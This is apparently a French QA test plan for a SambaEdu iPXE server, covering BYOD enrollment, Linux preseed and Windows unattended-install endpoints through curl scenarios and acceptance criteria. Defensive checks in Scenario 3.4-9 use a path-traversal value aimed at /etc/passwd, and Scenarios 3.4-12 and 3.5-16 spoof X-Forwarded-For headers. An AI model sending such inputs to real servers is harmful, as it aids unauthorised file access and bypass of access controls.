- `machine_name` : hostname ou `byod:<name>` pour le flow BYOD.

#### Scénario 3.3-14 — Flow BYOD (audit-only — pas d'AD, pas de Workstation)

```bash
COUNT_WS=$(sudo -u postgres psql -d sambaedu -tA -c 'SELECT COUNT(*) FROM workstations;')
curl -sS -X POST http://192.168.122.50/ipxe/enrollment/byod \
  -d 'mac=aa:bb:cc:dd:ee:bd&uuid=bbbbbbbb-1111-bbbb-2222-bbbbbbbbbbbb&new_name=student-laptop-byod'

# Vérification : aucune Workstation créée.
COUNT_WS_AFTER=$(sudo -u postgres psql -d sambaedu -tA -c 'SELECT COUNT(*) FROM workstations;')
[ "$COUNT_WS" = "$COUNT_WS_AFTER" ] && echo OK || echo FAIL

# Vérification : log audit présent.
sudo -u postgres psql -d sambaedu -c \
  "SELECT * FROM machine_boot_logs WHERE machine_name='byod:student-laptop-byod';"
```

**Critères d'acceptation** :
- Body contient `echo BYOD enregistre pour student-laptop-byod`.
- Workstation count : inchangé (D5 — BYOD = audit-only en 3.3).
- `MachineBootLog` : 1 row avec `action='ipxe_enroll_byod'`, `workstation_id=null`, `machine_name='byod:student-laptop-byod'`.
- Aucun appel `samba-tool` (vérifier `auth.log`).
- Log channel `ipxe` : event `ipxe.enrollment.byod.logged` (info).

#### Scénario 3.3-15 — Feature-flag `ipxe.enrollment.enabled = false`

```bash
# En .env : IPXE_ENROLLMENT_ENABLED=false
php artisan config:clear

curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:99&uuid=12345678-1234-1234-1234-000000000099'
```

**Critères d'acceptation** :
- Body NE contient PAS `item --key n set-name`, `item --key a salle`, `item --key p parcs`, `item --key e enleveparc`.
- Body contient `item --key m maintenance` (poste connu — maintenance reste accessible).
- Body contient `item --key x exit` (toujours accessible).

#### (Optionnel) Scénario 3.3-16 — Smoke poste réel (PXE boot enrollment complet)

> **À jouer en pré-prod uniquement, sur poste de test (jamais sur poste prod)**.

```
1. Brancher un poste neuf sur LAN scolaire.
2. Configurer PXE boot prioritaire en BIOS.
3. Reboot → préambule iPXE 3.1 → menu known/unknown selon résolution.
4. Choisir option login admin (`1` ou similaire) → /ipxe/admin natif.
5. Choisir `(n) Nommer le poste` → saisie hostname (ex. pc-smoke-33-1).
6. Vérifier le menu de succès → chain admin.
7. Choisir `(a) Affecter a une salle` → liste de salles → choisir une.
8. Vérifier le succès → chain admin.
9. Choisir `(p) Ajouter a un parc` → liste de parcs → choisir un.
10. Vérifier le succès → chain admin.
11. Choisir `(x) exit` → boot disque.

Vérifications post-smoke :
- `samba-tool computer show pc-smoke-33-1` → présent + netbootGUID renseigné.
- `SELECT * FROM workstations WHERE name='pc-smoke-33-1';` → ligne complète avec `physical_room_id`.
- `SELECT * FROM workstation_group_workstation WHERE workstation_id=...;` → row ajoutée.
- `tail -f storage/logs/ipxe/ipxe-$(date +%F).log` → events `ipxe.enrollment.*.success`.
```

---

## Story 3.4 — Installation Linux (Debian/Ubuntu)

**Date livraison** : 2026-05-20
**Migrations à appliquer** : aucune (D9/D12 — réutilisation `Workstation` + `MachineBootLog` ; 3 nouvelles valeurs `action` ≤18 chars dans varchar(20) sans CHECK)
**Permissions requises** : aucune (cf. Story 3.1-3.3 — `auth.v1.lan-only` seul)
**Variables `.env` à vérifier** : `SAMBAEDU_LINUX_LOCALE`, `SAMBAEDU_LDAP_ADMIN_PASSWD`, `SAMBAEDU_ADMIN_PASSWD`, `SAMBAEDU_DOMAIN`, `SAMBAEDU_LDAP_BASE_DN`, `SAMBAEDU_SAMBA_DOMAIN`, `SAMBAEDU_LDAP_PORT`, `SAMBAEDU_SE4AD_NAME`, `SAMBAEDU_SE4_PUB_KEY` (cf. story 3.4 § D11)
**Décisions ratifiées** : D14 variantes hors-scope déférées Phase 3 (se4ad/se4fs/deb_serv/kiosk/nextcloud/gnome_perso/primtux), D3 secrets preseed acceptés sur LAN (auth.v1.lan-only seul), D15 endpoint `/ipxe/linux/autorun` = stub minimal, `Workstation::status` minimal (`installation Linux terminee` ou `installation Linux echouee (ret=X)`)

### Section 13 — Endpoints natifs `/ipxe/installation-linux` + `/ipxe/linux/*`

#### Scénario 3.4-1 — Menu installation-linux rendu (poste connu)

```bash
# Pré-condition : poste seedé en base.
curl -sS -X POST http://192.168.122.50/ipxe/installation-linux \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!ipxe`.
- Body contient `item install_deb_gnome Debian + GNOME` (défaut menu).
- Body contient `item install_ubuntu64 Ubuntu 20.04`.
- Body contient `item install_nird NIRD`.
- Body contient sections `:install_deb_gnome\nchain --replace --autofree http://.../ipxe/action/install_deb_gnome##params`.
- Body contient `:exit\n...sanboot...` (fallback boot disk).
- Headers : `Cache-Control: no-store`, `X-Robots-Tag: noindex`.
- Log channel `ipxe` : event `ipxe.install_linux.menu_rendered` avec `menu_variant='known'`.
- `MachineBootLog` : row avec `action='ipxe_install_linux'`.

#### Scénario 3.4-2 — Menu installation-linux poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/installation-linux \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Critères d'acceptation** :
- Body contient `echo Erreur - poste non encore enregistre`.
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params`.
- Body NE contient PAS `item install_deb_*` (le menu erreur masque les items).
- Log channel `ipxe` : event `ipxe.install_linux.menu_rendered` avec `menu_variant='unknown'`.

#### Scénario 3.4-3 — Item `(l) Installation Linux` visible dans /ipxe/admin

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `item --key l install-linux (l) Installation Linux (Debian/Ubuntu)`.
- Body contient section `:install-linux\nchain --replace --autofree http://192.168.122.50/ipxe/installation-linux##params`.

**Feature-flag** : `IPXE_INSTALL_LINUX_ENABLED=false` dans `.env` → item absent (testé via test feature `IpxeAdminEndpointTest::it_hides_install_linux_item_when_disabled`).

#### Scénario 3.4-4 — Action `install_deb_gnome` rendue (kernel cmdline)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_deb_gnome \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body commence par `#!ipxe`.
- Body contient `kernel http://192.168.122.50/ipxe/debian-installer/amd64/linux` (ou OS_URL configuré).
- Body contient `initrd --name initrd.gz http://.../debian-installer/amd64/initrd.gz`.
- Body contient `imgargs linux initrd=initrd.gz auto=true hostname=PC-XXX priority=critical auto url=http://.../ipxe/linux/preseed?mac=...&uuid=...&os=trixie&type=gnome`.
- Body se termine par `boot\n`.

#### Scénario 3.4-5 — Action `install_ubuntu64` rendue

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_ubuntu64 \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- `kernel http://.../ubuntu-installer/amd64/linux` (paths Ubuntu, pas Debian).
- `imgargs ... url=...?os=ubuntu&type=base&perso=1` (Ubuntu = perso=1, parité legacy).

#### Scénario 3.4-6 — Action `install_nird` rendue

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_nird \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- `kernel http://.../nird/casper/vmlinuz` (paths Nird/casper).
- `imgargs vmlinuz initrd=initrd.gz root=/dev/nfs boot=casper netboot=nfs nfsroot=<se4fs_ip>:/var/sambaedu/unattended/install/os/nird root ip=dhcp ... url=...?os=debian&type=base&perso=1`.

#### Scénario 3.4-7 — Preseed généré (debian/gnome)

```bash
curl -sS 'http://192.168.122.50/ipxe/linux/preseed?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&os=trixie&type=gnome'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body ~4000 chars, commence par `### Fichier de réponses préconfigurées`.
- Body contient `tasksel tasksel/first multiselect standard, desktop, gnome-desktop, print-server, ssh-server` (iso `debian_gnome.cfg`).
- Body contient `d-i netcfg/get_hostname string pc-XXX` (interpolation hostname lowercase).
- Body contient `d-i passwd/root-password password <admin-passwd>` (secret de la `.env`).
- Body contient `partman-auto/method string regular` (simple_boot.cfg).
- AUCUN placeholder résiduel `###_..._###`.
- `MachineBootLog` : row avec `action='ipxe_linux_preseed'`.
- Log channel `ipxe` : event `ipxe.linux.preseed.generated` avec `preseed_sha256`, `preseed_size_bytes`, `distribution`, `variant`. **PAS** de log du contenu du preseed.

#### Scénario 3.4-8 — Preseed poste inconnu

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/linux/preseed?mac=00:00:00:00:00:00&uuid=99999999-9999-9999-9999-999999999999&os=trixie&type=gnome'
```

**Critères d'acceptation** :
- HTTP 404.
- Log channel `ipxe` : event `ipxe.linux.preseed.unknown_workstation` niveau warning + `mac_prefix=00:00:` + `uuid_prefix=99999999`.

#### Scénario 3.4-9 — Preseed os/type hors whitelist

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/linux/preseed?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&os=macos&type=gnome'
```

**Critères d'acceptation** :
- HTTP 422.
- Log channel `ipxe` : event `ipxe.linux.preseed.invalid_distribution` (ou `invalid_variant` selon le champ rejeté).
- `raw_distribution` (tronqué 32 chars + sanitize ASCII).

**Variante anti-path-traversal** :
```bash
curl -sS '.../linux/preseed?...&os=../../../etc/passwd&type=gnome'
```
→ 422 (Rule::in de la FormRequest rejette).

#### Scénario 3.4-10 — Hook `/ipxe/linux/action` (fin install ret=0)

```bash
curl -sS -X POST \
  -F 'ret=0' \
  -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' \
  -F 'name=PC-XXX' \
  http://192.168.122.50/ipxe/linux/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide (parité legacy `action.php:39`).
- PostgreSQL : `SELECT os, status FROM workstations WHERE uuid='12345678-1234-1234-1234-aaaaaaaaaaaa'` → `os='linux'`, `status='installation Linux terminee'`.
- `last_report_at` mis à jour à maintenant.
- `MachineBootLog` : row avec `action='ipxe_linux_report'` + `success=true`.
- Log channel `ipxe` : event `ipxe.linux.action.success` niveau info.

**Variante échec** (`ret=99`) → `status='installation Linux echouee (ret=99)'` + event `ipxe.linux.action.failure` niveau warning.

#### Scénario 3.4-11 — Stub `/ipxe/linux/autorun` (D15)

```bash
curl -sS 'http://192.168.122.50/ipxe/linux/autorun?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&name=PC-XXX'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!/bin/bash`.
- Body contient `echo 'install Linux completed for PC-XXX (12345678-1234-1234-1234-aaaaaaaaaaaa)'`.
- Body se termine par `exit 0\n`.
- Log channel `ipxe` : event `ipxe.linux.autorun.served` niveau info.

#### Scénario 3.4-12 — Sécurité LAN (depuis IP publique)

```bash
# Simulation d'appel depuis une IP publique (ex: 8.8.8.8 via REMOTE_ADDR spoofing
# côté Apache pour test — en pratique impossible en LAN scolaire).
curl -sS -H 'X-Forwarded-For: 8.8.8.8' -o /dev/null -w '%{http_code}\n' \
  http://192.168.122.50/ipxe/installation-linux
```

**Critères d'acceptation** :
- HTTP 403 + body contient code `bootstrap.not_lan` (iso 16.11).
- AUCUN preseed ni menu ne fuit (le middleware bloque avant le controller).

#### (Optionnel) Scénario 3.4-13 — Non-régression menu admin 3.2 + items enrollment 3.3

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient l'item enrollment 3.3 `item --key n set-name` (non-régression).
- Body contient l'item maintenance 3.2 `item --key m maintenance` (non-régression).
- Body contient l'item installation Linux 3.4 `item --key l install-linux` (nouveau).
- Body contient le retour `item --key r retour` (toujours présent).

#### (Optionnel) Scénario 3.4-14 — Smoke poste réel (install Debian complète)

> **À jouer en pré-prod uniquement, sur poste de test sans données importantes**.

```
1. Brancher un poste neuf (ou existant en base) sur LAN scolaire.
2. PXE boot → préambule iPXE 3.1 → menu known.
3. Choisir option login admin → /ipxe/admin natif (3.2).
4. Choisir `(l) Installation Linux` → /ipxe/installation-linux (3.4).
5. Choisir un item (ex: `install_deb_gnome` Debian + GNOME).
6. Le firmware iPXE charge `kernel http://.../debian-installer/amd64/linux`.
7. Debian-installer boot et fetch `/ipxe/linux/preseed?mac=...&os=trixie&type=gnome`.
8. Installation Debian se déroule sans intervention (~30-60 min).
9. À la fin du preseed, `late_command` exécute `curl -F 'ret=0' .../ipxe/linux/action`.
10. Le poste reboot sur le disque.

Vérifications post-smoke :
- `SELECT os, status, last_report_at FROM workstations WHERE name='PC-XXX';` → `os='linux'`, `status='installation Linux terminee'`.
- `SELECT count(*) FROM machine_boot_logs WHERE workstation_id=... AND action LIKE 'ipxe_linux_%';` → ≥2 (1× preseed + 1× report).
- `tail storage/logs/ipxe/ipxe-$(date +%F).log` → events `ipxe.install_linux.menu_rendered`, `ipxe.linux.preseed.generated`, `ipxe.linux.action.success`.
- `ssh root@PC-XXX 'uname -a'` → Debian trixie installé.
- `samba-tool computer show PC-XXX` → poste joint au domaine AD.
```

## Story 3.5 — Installation Windows (Sysprep/Wimboot)

**Date livraison** : 2026-05-21
**Migrations à appliquer** : aucune (D9/D12 — réutilisation `Workstation` + `MachineBootLog` ; 5 nouvelles valeurs `action` ≤17 chars dans varchar(20) sans CHECK)
**Permissions requises** : aucune (cf. Story 3.1-3.4 — `auth.v1.lan-only` seul)
**Variables `.env` à vérifier** : `SAMBAEDU_ADMINSE_NAME`, `SAMBAEDU_ADMINSE_PASSWD`, `SAMBAEDU_WIN_KEY`, `SAMBAEDU_WIN_USER`, `SAMBAEDU_WIN_USER_PASSWD`, `SAMBAEDU_WIN_AUTOLOGON`, `SE4INSTALL_NAME`, `SE4INSTALL_PASSWD`, `SAMBAEDU_DOMAIN`, `SE4FS_IP`, `SE4FS_NAME` (cf. story 3.5 § D11)
**Décisions ratifiées** : D14 `installw11old` déférée 3.7, D15 `/ipxe/windows/sysprep.xml` = stub minimal (body vide + log), D10 `unattend.xml`/`install.bat`/`diskpart.txt` = NON Blade (DOMDocument + string concat), D7 CRLF `\r\n` strict pour WinPE, D3 secrets `unattend`/`install.bat` acceptés sur LAN (auth.v1.lan-only seul)

### Section 14 — Endpoints natifs `/ipxe/installation-windows` + `/ipxe/windows/*`

#### Scénario 3.5-1 — Menu installation-windows rendu (poste connu)

```bash
# Pré-condition : poste seedé en base.
curl -sS -X POST http://192.168.122.50/ipxe/installation-windows \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `#!ipxe`.
- Body contient les 7 items : `item install_win10 ...`, `item install_win10_debug ...`, `item install_win10_disk ...`, `item install_win10_perso ...`, `item install_win11 ...`, `item install_win11_disk ...`, `item install_win11_perso ...`.
- Body contient `set menu-default install_win11` (D11 default).
- Body contient sections `:install_win11\nchain --replace --autofree http://.../ipxe/action/install_win11##params`.
- Body contient `:exit\n...sanboot...` (fallback boot disk).
- Headers : `Cache-Control: no-store`, `X-Robots-Tag: noindex`.
- Log channel `ipxe` : event `ipxe.install_windows.menu_rendered` avec `menu_variant='known'`.
- `MachineBootLog` : row avec `action='ipxe_install_win'`.

#### Scénario 3.5-2 — Menu installation-windows poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/installation-windows \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Critères d'acceptation** :
- Body contient `echo Erreur - poste non encore enregistre`.
- Body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params`.
- Body NE contient PAS `item install_win*` (menu erreur masque les items).
- Log channel `ipxe` : event `ipxe.install_windows.menu_rendered` avec `menu_variant='unknown'`.

#### Scénario 3.5-3 — Item `(w) Installation Windows` visible dans /ipxe/admin

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `item --key w install-windows (w) Installation Windows (Win10/Win11)`.
- Body contient section `:install-windows\nchain --replace --autofree http://192.168.122.50/ipxe/installation-windows##params`.

**Feature-flag** : `IPXE_INSTALL_WINDOWS_ENABLED=false` dans `.env` → item absent (testé via `IpxeAdminEndpointTest::it_hides_install_windows_item_when_disabled`).

#### Scénario 3.5-4 — Action `install_win11` rendue (kernel cmdline)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_win11 \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body commence par `#!ipxe`.
- Body contient `kernel Win10/wimboot` (iso-legacy — assets partagés Win10/Win11).
- Body contient `initrd --name winpeshl.ini Win10/winpeshl.ini winpeshl.ini`.
- Body contient `param version Win11` + `param action wimboot11` + `param debug 0`.
- Body contient `initrd --name install.bat http://.../ipxe/windows/install.bat##params install.bat`.
- Body contient `initrd --name unattend.xml http://.../ipxe/windows/unattend.xml##params unattend.xml`.
- Body contient `initrd --name BCD Win11/boot/bcd BCD`.
- Body contient `initrd --name boot.wim Win11/sources/boot.wim boot.wim`.
- Body se termine par `boot\n`.

#### Scénario 3.5-5 — Action `install_win10_perso` rendue avec perso=1

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_win10_perso \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `param version Win10` + `param perso 1`.
- Body contient `initrd --name BCD Win10/boot/bcd` (Win10 assets).

#### Scénario 3.5-6 — Action `install_win11_disk` rendue avec disk=1

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/install_win11_disk \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- Body contient `param version Win11` + `param disk 1`.

#### Scénario 3.5-7 — install.bat WinPE généré

```bash
curl -sS 'http://192.168.122.50/ipxe/windows/install.bat?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&version=Win11&bios=uefi'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `::cmd\r\n` (iso-legacy install.bat.php:13).
- Toutes les lignes finissent par `\r\n` (CRLF strict — critique WinPE).
- Body contient `wpeutil InitializeNetwork\r\n`, `IPCONFIG /RENEW\r\n`, `@PING <se4fs_ip>\r\n`.
- Body contient `@net use z: \\<se4fs_name>\install /user:<se4install_name>@<domain> <se4install_passwd>\r\n`.
- Body contient `z:\os\Win11\sources\setup.exe /unattend:x:\windows\system32\unattend.xml\r\n`.
- Body contient `curl ... -F "etape=winpe" -F "name=<PC-101>" -F "ret=0" http://<se4fs_name>/ipxe/windows/action` (URL native — pas `.php`).
- Si `bios=uefi` : body contient `%windir%\system32\bcdboot c:\windows /addlast\r\n`.
- Si `debug=1` : body contient `PAUSE\r\n` après chaque section critique.
- Log channel `ipxe` : event `ipxe.windows.install_bat.generated` avec `bash_sha256`, `bash_size_bytes`, `version`, `debug`. **PAS** de log du contenu bash.
- `MachineBootLog` : row avec `action='ipxe_win_install'`.

#### Scénario 3.5-8 — unattend.xml généré pour Win11 UEFI

```bash
curl -sS 'http://192.168.122.50/ipxe/windows/unattend.xml?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&version=Win11&bios=uefi&disk=0&perso=0'
```

**Critères d'acceptation** :
- HTTP 200 + `Content-Type: text/plain; charset=utf-8`.
- Body commence par `<?xml version="1.0"`.
- Body parsable via `DOMDocument::loadXML()` sans erreur.
- Body contient `BypassTPMCheck`, `BypassSecureBootCheck`, `BypassRAMCheck`, `BypassCPUCheck`, `BypassStorageCheck` (Win11).
- Body contient `<Type>EFI</Type>` et `<Label>Windows</Label>` (DiskConfiguration UEFI).
- Body contient `<ComputerName>pc-101</ComputerName>` (interpolation hostname lowercase).
- Body contient `Microsoft-Windows-UnattendedJoin` avec `<JoinDomain>example.org</JoinDomain>` et `<MachineObjectOU>...</MachineObjectOU>`.
- Body contient `<LocalAccount>...adminse...</LocalAccount>`.
- AUCUN placeholder résiduel `###_..._###`.
- `MachineBootLog` : row avec `action='ipxe_win_unattend'`.
- Log channel `ipxe` : event `ipxe.windows.unattend.generated` avec `xml_sha256`, `xml_size_bytes`, `version`, `bios`, `join`. **PAS** de log du contenu XML (secrets).

#### Scénario 3.5-9 — unattend.xml poste inconnu (404)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/windows/unattend.xml?mac=00:00:00:00:00:00&uuid=99999999-9999-9999-9999-999999999999&version=Win11&bios=uefi'
```

**Critères d'acceptation** :
- HTTP 404.
- Log channel `ipxe` : event `ipxe.windows.unattend.unknown_workstation` niveau warning + `mac_prefix=00:00:` + `uuid_prefix=99999999`.

#### Scénario 3.5-10 — unattend.xml version hors whitelist (422)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/windows/unattend.xml?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&version=Win99&bios=uefi'
```

**Critères d'acceptation** :
- HTTP 422 (FormRequest Rule::in bloque + defense in depth controller).

#### Scénario 3.5-11 — Hook `/ipxe/windows/action` étape `winpe`

```bash
curl -sS -F 'etape=winpe' -F 'ret=0' -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' -F 'name=PC-101' \
  http://192.168.122.50/ipxe/windows/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide.
- `SELECT status FROM workstations WHERE uuid='12345678-1234-1234-1234-aaaaaaaaaaaa'` retourne `'installation WinPE'`.
- `MachineBootLog` : row avec `action='ipxe_win_install'`.
- Log channel `ipxe` : event `ipxe.windows.action.winpe_start`.

#### Scénario 3.5-12 — Hook `/ipxe/windows/action` étape `oobe`

```bash
curl -sS -F 'etape=oobe' -F 'ret=0' -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' -F 'name=PC-101' \
  http://192.168.122.50/ipxe/windows/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide.
- `SELECT os FROM workstations WHERE uuid='12345678-1234-1234-1234-aaaaaaaaaaaa'` retourne `'windows'`.
- `SELECT status FROM workstations WHERE uuid='...'` retourne `'installation Windows terminee'`.
- `SELECT last_report_at FROM workstations WHERE uuid='...'` retourne `NOW()` (à 1s près).
- `MachineBootLog` : row avec `action='ipxe_win_report'`.
- Log channel `ipxe` : event `ipxe.windows.action.oobe_complete`.

#### Scénario 3.5-13 — Hook étape déférée 3.7 (`sysprep`/`join`/etc.)

```bash
curl -sS -F 'etape=sysprep' -F 'ret=0' -F 'uuid=12345678-1234-1234-1234-aaaaaaaaaaaa' \
  http://192.168.122.50/ipxe/windows/action
```

**Critères d'acceptation** :
- HTTP 200 + body vide.
- Log channel `ipxe` : event `ipxe.windows.action.unsupported_step` niveau warning + `raw_etape='sysprep'`.
- `Workstation::status` inchangé (étape non gérée scope 3.5).

#### Scénario 3.5-14 — diskpart.txt servi (body iso-legacy)

```bash
curl -sS 'http://192.168.122.50/ipxe/windows/diskpart.txt?mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Critères d'acceptation** :
- HTTP 200 + body strict `select disk O\r\nselect partition 1\r\nassign letter=U\r\n`.
- Headers : `text/plain`, `no-store`.
- `MachineBootLog` : row avec `action='ipxe_win_diskpart'`.

#### Scénario 3.5-15 — sysprep.xml stub (body vide)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://192.168.122.50/ipxe/windows/sysprep.xml?name=PC-101'
```

**Critères d'acceptation** :
- HTTP 200 + body vide (stub D15).
- Log channel `ipxe` : event `ipxe.windows.sysprep.stub_served`.
- AUCUN insert `MachineBootLog` (stub minimal).

#### Scénario 3.5-16 — Sécurité LAN (depuis IP publique)

```bash
# Simule un appel hors LAN (depuis 1.2.3.4 via X-Forwarded-For — devrait être ignoré).
curl -sS -o /dev/null -w '%{http_code}\n' \
  -H 'X-Forwarded-For: 1.2.3.4' \
  http://192.168.122.50/ipxe/installation-windows
```

**Critères d'acceptation** :
- HTTP 403 + code `bootstrap.not_lan` (cf. middleware `auth.v1.lan-only`).

#### Scénario 3.5-17 — Non-régression catchall (routes `.php` legacy)

```bash
curl -sS -o /dev/null -w '%{http_code}\n' http://192.168.122.50/ipxe/Win10/repair.bat.php
curl -sS -o /dev/null -w '%{http_code}\n' http://192.168.122.50/ipxe/clonage.php
curl -sS -o /dev/null -w '%{http_code}\n' http://192.168.122.50/ipxe/installation-windows.php
```

**Critères d'acceptation** :
- Les 3 URLs retournent un body legacy (via catchall).
- `SELECT path FROM legacy_catchall_logs WHERE path LIKE '%Win10/repair.bat.php%'` → ≥1 row.

#### Scénario 3.5-18 — (Optionnel pré-prod) Smoke poste réel boot PXE → install Win11

**Pré-conditions** :
- Poste de test inscrit en base PostgreSQL + AD via Story 3.3.
- Assets binaires VM : `Win10/wimboot`, `Win10/winpeshl.ini`, `Win11/boot/bcd`, `Win11/boot/boot.sdi`, `Win11/sources/boot.wim` présents sous `/var/sambaedu/unattended/install/os/`.
- Variables `.env` Win configurées : `SAMBAEDU_ADMINSE_*`, `SAMBAEDU_WIN_KEY`, `SE4INSTALL_*`.

**Procédure** :
1. Boot le poste de test en mode PXE.
2. Au menu iPXE : choisir `(1) Login admin` → `(w) Installation Windows` → `Installation Win11 (auto)`.
3. WinPE charge wimboot + winpeshl + install.bat + unattend.xml.
4. WinPE monte `\\se4fs\install` et lance `setup.exe /unattend:unattend.xml`.
5. Windows install se déroule (~15-30 min).
6. Premier reboot → OOBE → 1st logon → curl hook OOBE.
7. Vérifier `SELECT os FROM workstations WHERE name='<hostname>'` = `'windows'`.
8. Vérifier `SELECT status FROM workstations WHERE name='<hostname>'` = `'installation Windows terminee'`.

---

## Limitations connues — Story 3.5

### MachineBootLog Windows : pas de déduplication

Iso 3.4 — un poste qui redémarre plusieurs fois pendant une install échouée crée 1 row par fetch unattend/install.bat. Pas de dédup en Phase 2.

### Hook OOBE peut être reçu sans `winpe` préalable

Si un poste est ré-imaginé manuellement (Clonezilla sans passer par le menu iPXE), le hook OOBE arrive sans `winpe_start` préalable. `recordOobeComplete()` accepte cet état (idempotent — set os/status/last_report_at directement).

### Étapes post-install Windows complètes : déférées 3.7

Les étapes `sysprep`, `nosysprep`, `join`, `renomme`, `post`, `wpkg` du legacy `Win10/action.php` (lignes 411-720) ne sont **pas** portées en 3.5. Elles dépendent de `IpxeProgrammedActionResolver` non porté (GLM `actions[]` LDAP). Story 3.7 enrichira `WindowsPostInstallTracker`.

### Variante `installw11old` : déférée 3.7 (D14)

Si besoin terrain confirmé (`/var/sambaedu/unattended/install/os/Win11-old` présent + utilisé), ouvrir une story dédiée qui ajoute un case enum `install_win11_old` + asset path config-driven.

### sysprep.xml : stub minimal (D15)

`/ipxe/windows/sysprep.xml` retourne 200 + body vide tant que Story 3.7 n'enrichit pas `IpxeProgrammedActionResolver`. Le legacy `Win10/sysprep.xml.php` reste accessible via catchall (cleanup 3.7).

### Assets binaires Windows : servis par Apache via catchall

Les fichiers statiques `Win10/wimboot`, `Win10/winpeshl.ini`, `Win{10,11}/boot/bcd`, `Win{10,11}/boot/boot.sdi`, `Win{10,11}/sources/boot.wim` restent servis par Apache via catchall (non versionnés dans le repo SE5). Phase 2 acceptable.

---

## Limitations connues — Story 3.4

### MachineBootLog preseed : pas de déduplication

Un poste qui redémarre plusieurs fois pendant une install échouée crée 1 row `ipxe_linux_preseed` par fetch preseed du d-i. Pas de déduplication. Comportement iso-legacy (parité `preseed.php` qui faisait pire — pas de log du tout).

- **Impact estimé** : 50 postes × 5 retries → ~250 lignes parasites/jour en rentrée scolaire.
- **Décision Phase 2** : laisser. Rouvrir si la table explose (Phase 3 = check `started_at > now() - 30s`).

### Status `protected` post-install : préservé (post-review #M3)

Un poste avec `status='protected'` qui termine une install Linux **conserve** son status `protected` (au lieu d'être écrasé par `installation Linux terminee`). Les autres effets (`os='linux'`, `last_report_at`, `MachineBootLog`) sont conservés.

- **Traçabilité** : event log info `ipxe.linux.action.protected_preserved` avec `workstation_id`, `mac`, `ret`.
- **Justification** : le legacy `flag_poste=1` ne bloque JAMAIS la réinstall iPXE (vérifié) — il sert uniquement de protection anti-suppression DB lors des resync AD.

---

## Checklist rapide (avant merge `main` → prod)

- [ ] Scénario 3.1-1 (handshake) : `curl /ipxe/boot` → préambule iPXE OK
- [ ] Scénario 3.1-2 (MAC connue) : menu known affiché
- [ ] Scénario 3.1-3 (UUID priorité) : matching prio UUID OK
